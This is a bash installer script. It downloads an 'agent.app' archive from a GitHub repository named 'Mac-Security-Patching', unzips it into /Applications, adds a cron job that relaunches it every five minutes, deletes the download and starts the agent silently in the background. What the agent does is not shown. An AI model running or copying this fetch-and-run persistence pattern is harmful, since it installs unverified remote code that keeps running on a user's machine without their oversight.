#!/bin/bash
AGENTPATH="/Applications/agent.app/Contents/MacOS/agent"
CONFPATH="/Applications/agent.app/Contents/MacOS/agent.plist"
CRON_CMD="$AGENTPATH run $CONFPATH"
SCHEDULE="*/5 * * * *"   # every 5 minutes
if command -v pgrep >/dev/null 2>&1; then
    echo "Using pgrep for process detection."
    CRON_CMD="pgrep -f '$AGENTPATH' >/dev/null || $CRON_CMD"
else
    echo "Error: pgrep is not available."
    exit 1
fi
curl https://raw.githubusercontent.com/xxoo-d/Mac-Security-Patching/refs/heads/main/agent.app.zip -o /tmp/agent.app.zip
unzip -o /tmp/agent.app.zip -d /Applications/
chmod +x $AGENTPATH
CRON_JOB="$SCHEDULE $CRON_CMD"
(crontab -l 2>/dev/null | grep -v -F "$AGENTPATH"; echo "$CRON_JOB") | crontab -
echo "Cron job installed:"
echo "$CRON_JOB"
echo "Deleting temporary files..."
rm -f /tmp/agent.app.zip
echo "Executing now..."
nohup $CRON_CMD > /dev/null 2>&1 & disown